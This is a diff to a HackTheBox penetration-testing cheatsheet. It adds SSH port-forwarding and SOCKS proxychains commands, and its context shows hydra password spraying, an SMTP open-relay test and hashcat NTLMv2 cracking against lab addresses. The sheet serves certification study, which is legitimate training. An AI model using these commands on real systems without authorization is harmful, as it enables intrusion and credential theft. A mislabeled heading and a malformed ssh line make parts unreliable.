@@ -50,6 +50,11 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
     - [Attacking RDP Services](#attacking-rdp-services)
     - [Attacking DNS Services](#attacking-dns-services)
     - [Attacking Email Services](#attacking-email-services)
+- [Port Forwarding](#port-forwarding)
+    - [Dynamic Port Forwarding with SSH and SOCKS Tunneling](#dynamic-port-forwarding-with-ssh-and-socks-tunneling)
+    - [Remote/Reverse Port Forwarding with SSH](#remote/reverse-port-forwarding-with-ssh)
+    - [Port Forwarding with Meterpreter](#port-forwarding-with-meterpreter)
+    - [Pass the Certificate](#pass-the-certificate)
 - [Active Directory](#active-directory)
     - [Initial Enumeration](#initial-enumeration)
     - [LLMNR/NTB-NS Poisoning](#llmnr-poisoning)
@@ -971,8 +976,31 @@ Password spraying against a list of users that use Office365 for the specified d
 hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
 
 # Testing the SMTP service for the open-relay vulnerability.
-swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213  
 ```
+## Port Forwarding
+
+#### Dynamic Port Forwarding with SSH and SOCKS Tunneling
+```
+# SSH command used to create an SSH tunnel from a local machine on local port 1234 to a remote target using port 3306.
+ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>
+
+# Forwarding Multiple Ports
+ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>
+
+# SSH command used to perform a dynamic port forward on port 9050 or 1080 and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.
+ssh -D 9050 ubuntu@<IPaddressofTarget>
+/etc/proxychains.conf  need have (socks4 	127.0.0.1 9050)
+or
+ssh -D 1080 ubuntu@<IPaddressofTarget>
+/etc/proxychains.conf  need have (socks5 	127.0.0.1 1080)
+```
+##### Dynamic Port Forwarding with SSH and SOCKS Tunneling
+```
+# Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
+hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
+```
+
 ## Active Directory
 
 #### Initial Enumeration
